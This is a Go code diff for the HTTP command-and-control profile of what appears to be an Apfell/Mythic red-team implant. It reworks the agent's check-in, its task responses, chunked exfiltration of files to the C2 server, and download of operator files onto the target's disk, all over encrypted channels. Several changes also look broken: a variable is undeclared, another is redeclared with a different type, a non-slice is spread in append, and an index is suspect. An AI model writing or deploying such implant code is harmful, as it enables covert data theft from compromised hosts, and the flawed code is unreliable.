@@ -175,7 +175,7 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) map[st
 
 	//log.Printf("Received ApfellID: %+v\n", c)
 
-	if len(response.ID != 0) {
+	if len(response.ID) != 0 {
 		c.UUID = response.ID // Assign new UUID for the agent to use in every request
 		c.ApfellID = response.ID
 	}
@@ -237,10 +237,9 @@ func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
 
 		responseMsg := structs.TaskResponseMessage{}
 		resp := structs.TaskResponse{}
-		resp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
-		append(responseMsg.Responses, resp...)
-		//tResp := structs.TaskResponse{}
-		//tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
+		resp.Response = dataBuffer
+		responseMsg.Responses = append(responseMsg.Responses, resp...)
+
 		dataToSend, _ := json.Marshal(responseMsg)
 		ret := c.htmlPostData(urlEnding, dataToSend)
 		retData.Write(ret)
@@ -315,7 +314,7 @@ func (c *C2Default) htmlGetData(url string, body []byte) []byte {
 	client := &http.Client{}
 	var respBody []byte
 
-	if len(c.AesPSK != 0 && len(body) > 0) {
+	if len(c.AesPSK) > 0 && len(body) > 0 {
 
 		body = EncryptMessage(body, c.AesPSK) // Encrypt and then encapsulate the task request
 	}
@@ -404,10 +403,7 @@ func (c *C2Default) NegotiateKey() string {
 
 //SendFile - download a file
 func (c *C2Default) SendFile(task structs.Task, params string) {
-	//response := TaskResponse{}
-	fileReq := structs.Msg{}
-	//fileReq := structs.FileRegisterRequest{}
-	fileReq["task"] = task.ID
+
 	path := task.Params
 	// Get the file size first and then the # of chunks required
 	file, err := os.Open(path)
@@ -434,17 +430,62 @@ func (c *C2Default) SendFile(task structs.Task, params string) {
 
 // Get a file
 
-func (c *C2Default) GetFile(fileid string) []byte {
+func (c *C2Default) GetFile(fileDetails structs.FileUploadParams) bool {
+	success := false
 	url := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
-	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))
+	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
+	fileUploadMsg.Action = "upload"
+	fileUploadMsg.FileID = fileDetails.FileID
+	fileUploadMsg.ChunkSize = 1024000
+	fileUploadMsg.ChunkNum = 1
+	fileUploadMsg.FullPath = fileDetails.RemotePath
 
-	//decFileData := c.decryptMessage(encfileData)
-	if len(encfileData) > 0 {
-		rawData, _ := base64.StdEncoding.DecodeString(string(encfileData))
-		return rawData
+	msg, _ := json.Marshal(fileUploadMsg)
+	rawData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url), msg)
+
+	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
+	_ = json.Unmarshal(rawData, &fileUploadMsgResponse)
+
+	f, err := os.Create(fileDetails.RemotePath)
+	if err != nil {
+		return success
+	}
+	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
+
+	num, err = f.Write(decoded)
+
+	if err != nil {
+		return success
 	}
 
-	return make([]byte, 0)
+	success = true
+	if fileUploadMsgResponse.TotalChunks > 1 {
+		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
+			fileUploadMsg = structs.FileUploadChunkMessage{}
+			fileUploadMsg.Action = "upload"
+			fileUploadMsg.ChunkNum = index
+			fileUploadMsg.ChunkSize = 1024000
+			fileUploadMsg.FileID = fileDetails.FileID
+			fileUploadMsg.FullPath = fileDetails.RemotePath
+
+			msg, _ := json.Marshal(fileUploadMsg)
+			rawData = c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url), msg)
+			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
+			_ = json.Unmarshal(rawData, &fileUploadMsgResponse)
+
+			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
+
+			num, err = f.Write(decoded)
+
+			if err != nil {
+				success = false
+				break
+			}
+		}
+	}
+
+	return success
+
 }
 
 //SendFileChunks - Helper function to deal with file chunks (screenshots and file downloads)
@@ -455,20 +496,23 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 	const fileChunk = 512000 //Normal apfell chunk size
 	chunks := uint64(math.Ceil(float64(size) / fileChunk))
 
-	//chunkResponse := structs.FileRegisterRequest{}
-	chunkResponse := structs.Msg{}
-	chunkResponse["total_chunks"] = int(chunks)
-	chunkResponse["task"] = task.ID
+	chunkResponse := structs.FileDownloadInitialMessage{}
+	chunkResponse.NumChunks = int(chunks)
+	chunkResponse.TaskID = task.ID
 
 	msg, _ := json.Marshal(chunkResponse)
 	resp := c.PostResponse(task, string(msg))
-	fileResp := structs.Msg{}
+	fileResp := structs.TaskResponseMessageResponse{}
 
 	err := json.Unmarshal(resp, &fileResp)
 
 	if err != nil {
 		return
 	}
+
+	raw, _ := base64.StdEncoding.DecodeString(fileResp.Responses[1])
+	fileDetails := structs.FileDownloadInitialMessageResponse{}
+	_ = json.Unmarshal(raw, &fileDetails)
 
 	r := bytes.NewBuffer(fileData)
 	// Sleep here so we don't spam apfell
@@ -483,25 +527,29 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 			break
 		}
 
-		msg := structs.Msg{}
-		msg["chunk_data"] = base64.StdEncoding.EncodeToString(partBuffer)
-		msg["chunk_num"] = int(i) + 1
-		msg["file_id"] = fileResp["file_id"]
+		msg := structs.FileDownloadChunkMessage{}
+		msg.ChunkNum = int(i) + 1
+		msg.FileID = fileDetails.FileID
+		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
 
-		encmsg, _ := json.Marshal(msg)
-		tResp := structs.Msg{}
-		tResp.Response = base64.StdEncoding.EncodeToString(encmsg)
-		dataToSend, _ := json.Marshal(tResp)
+		msg, _ = json.Marshal(msg)
+		subResp := structs.Response{}
+		subResp.Response = base64.StdEncoding.EncodeToString(msg)
+		subResp.TaskID = task.TaskID
+		taskResp := structs.TaskResponseMessage{}
+		taskResp.Responses = append(taskResp.Responses, subResp...)
+		dataToSend, _ := json.Marshal(taskResp)
 
-		endpoint := fmt.Sprintf("api/v1.3/responses/%s", task.ID) // TODO: update this for 1.4
+		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // TODO: update this for 1.4
 		resp := c.htmlPostData(endpoint, dataToSend)
-		postResp := structs.FileChunkResponse{}
+		postResp := structs.TaskResponseMessageResponse{}
+
 		_ = json.Unmarshal(resp, &postResp)
 
-		if !strings.Contains(postResp.Status, "success") {
+		if !strings.Contains(postResp.Responses[1].Status, "success") {
 			// If the post was not successful, wait and try to send it one more time
 			time.Sleep(time.Duration(c.Interval) * time.Second)
-			resp = c.htmlPostData(endpoint, encmsg)
+			resp = c.htmlPostData(endpoint, dataToSend)
 		}
 		time.Sleep(time.Duration(c.Interval) * time.Second)
 	}
